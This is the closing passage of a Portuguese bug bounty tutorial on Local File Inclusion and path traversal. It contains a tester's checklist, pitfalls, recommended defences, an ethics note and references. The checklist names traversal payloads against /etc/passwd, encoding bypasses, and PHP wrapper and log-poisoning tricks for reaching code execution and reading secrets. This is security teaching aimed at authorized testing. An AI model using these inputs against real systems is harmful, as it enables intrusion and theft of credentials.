  - [OWASP WSTG — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion).
  - **DVWA** (módulo *File Inclusion*, com níveis low→high), **bWAPP**, TryHackMe, HackTheBox, HackingClub.

## Checklist do caçador

- [ ] Mapeei todo parâmetro com cheiro de arquivo (`file`, `path`, `page`, `template`, `doc`, `download`, `lang`...).
- [ ] Confirmei com arquivo inofensivo: `/etc/passwd` (Linux) ou `win.ini` (Windows).
- [ ] Testei profundidade de `../` "de sobra" (6–10) e caminho absoluto.
- [ ] Tentei bypass de prefixo de pasta (`/base/../../../etc/passwd`).
- [ ] Tentei bypass de filtro: `....//`, encoding `%2e%2e%2f`, **duplo encoding** `%252e..`, UTF-8 `..%c0%af`.
- [ ] Testei null byte `%00` (só faz sentido em legado com extensão forçada).
- [ ] Se for PHP: `php://filter` pra ler fonte; avaliei log poisoning, `data://`, `php://input`, `expect://`, `/proc/self/environ`.
- [ ] Se houver **upload** + LFI: tentei `zip://`/`phar://` (subir arquivo com código e incluí-lo).
- [ ] Procurei arquivos de **valor** (config, `.env`, `web.config`, chaves) — sem dumpar dado real de cliente.
- [ ] Avaliei se dá pra **escalar pra RCE** (define severidade crítica).
- [ ] Conferi que a falha **está no escopo** do programa.

## Pegadinhas / o que NÃO funciona

- **`%00` em PHP moderno** não funciona (corrigido no 5.3.4). Só conta em legado/CTF.
- **RFI** quase sempre falha — `allow_url_include` vem `Off`. Não perca tempo demais nele.
- **Incluir um `.php` direto** te dá só a *saída* (HTML), não o fonte. Pra ler o código, use `php://filter`.
- **`data://`/`php://input`/`expect://`** dependem de configuração que raramente está ligada. Teste, mas não conclua "não tem LFI" só porque o wrapper falhou — `php://filter` e log poisoning podem funcionar mesmo assim.
- **Filtro que remove `../` uma vez** dá falsa sensação de segurança: `....//` derruba ele. Não confunda "filtrado" com "seguro".
- **Path do log varia por distro** (`apache2` vs `httpd`, Nginx). Testar um caminho só e desistir é erro comum.

## O que você precisa lembrar

- **Path Traversal** = sair da pasta pretendida pra **ler** arquivo arbitrário (`../`, encoding, caminho absoluto).
- **LFI** = a aplicação **inclui/interpreta** o arquivo → leitura **e** potencial **execução** (clássico PHP).
- A raiz é sempre a mesma: **input do usuário concatenado num caminho de arquivo** sem validação.
- O valor está no que você lê (config/segredos > `/etc/passwd`) e em **escalar pra RCE** (wrappers, log poisoning).
- A defesa que fecha: **allowlist** + **canonicalização** (`realpath`/`getCanonicalPath`) + checar prefixo da base. Nunca `include` quando é só pra baixar.

> 💡 **Dica de ouro:** quando achar leitura de arquivo, **não pare no `/etc/passwd`**. Esse arquivo só *prova* a falha. O bounty grande está em fazer duas perguntas: "qual config com segredo eu alcanço daqui?" e "isso vira execução de comando?". A diferença entre R$500 e R$5.000 mora exatamente nessas duas perguntas.

## Nota ética

Tudo aqui é pra **testes autorizados** — bug bounty dentro do escopo, pentests contratados e labs legais. Ao provar a falha, leia **arquivos inofensivos** (`/etc/passwd`, `win.ini`) e **pare**: não baixe dados de clientes, não dumpe bancos, não rode comandos destrutivos. A PoC mínima que demonstra o risco é mais valiosa — e ética — do que o dano. Ler arquivos de sistemas de terceiros sem autorização é crime, e desnecessário quando existe tanto lab bom pra treinar. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [PortSwigger — File path traversal](https://portswigger.net/web-security/file-path-traversal) (conceito + todos os labs de bypass)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [OWASP WSTG — Testing for Local File Inclusion](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [The Hacker Recipes — PHP wrappers and streams (LFI to RCE)](https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/php-wrappers-and-streams)
- [HackTricks — LFI2RCE via PHP Filters](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/lfi2rce-via-php-filters.html)
- [Synacktiv — php_filter_chain_generator (LFI2RCE só com php://filter)](https://github.com/synacktiv/php_filter_chain_generator)
- [BlackHat 2018 — Phar:// stream wrapper / PHP unserialization (Sam Thomas)](https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf)
- [jolokia-exploitation-toolkit](https://github.com/laluka/jolokia-exploitation-toolkit) (LFI/RCE via Jolokia exposto)
- [reddelexc/hackerone-reports — Top File Reading reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPFILEREADING.md)

---
*Próximo na série: [CRLF Injection e HTTP Request Smuggling: quebrando o protocolo](/posts/crlf-request-smuggling/) · relacionados: [SSRF — fazendo o servidor bater onde você quer](/posts/ssrf/) · [Security Misconfiguration & CVE Hunting](/posts/security-misconfiguration-cve-hunting/) · [IDOR/BOLA/BFLA](/posts/broken-access-control-idor-bola-bfla/) · base: [Recon & Discovery](/posts/recon-discovery/)*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
